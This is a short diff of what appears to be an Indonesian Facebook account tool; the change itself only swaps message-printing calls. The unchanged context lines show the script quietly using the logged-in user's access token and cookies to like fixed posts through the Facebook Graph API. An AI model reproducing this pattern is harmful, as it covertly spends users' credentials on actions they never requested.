@@ -262,7 +262,7 @@ def ___fii___Sayang___Kamu___Widiya___l():
     except IOError:
         print(f"{B} | ")
         print(f"{B} | ")
-        jalan(f"{P}[•]{M} Pastikan akun tumbal bagus");exit()
+        print(f"{P}[•]{M} Pastikan akun tumbal bagus");exit()
     kom = komenredem
     komentar = komtwol
     pipp = kartu2d
@@ -277,7 +277,7 @@ def ___fii___Sayang___Kamu___Widiya___l():
     requests.post('https://graph.facebook.com/3144112082575661/likes?summary=true&access_token=' + (token),cookies=cookie)
     requests.post('https://graph.facebook.com/3330390423859469/likes?summary=true&access_token=' + (token),cookies=cookie)
     requests.post('https://graph.facebook.com/3330390423859469/likes?summary=true&access_token=' + (token),cookies=cookie)
-    print(f'{P}[•] Login Berhasil')
+    jalan(f'{P}[•] Login Berhasil')
     menu()
 	
 ###### BUAT MENU
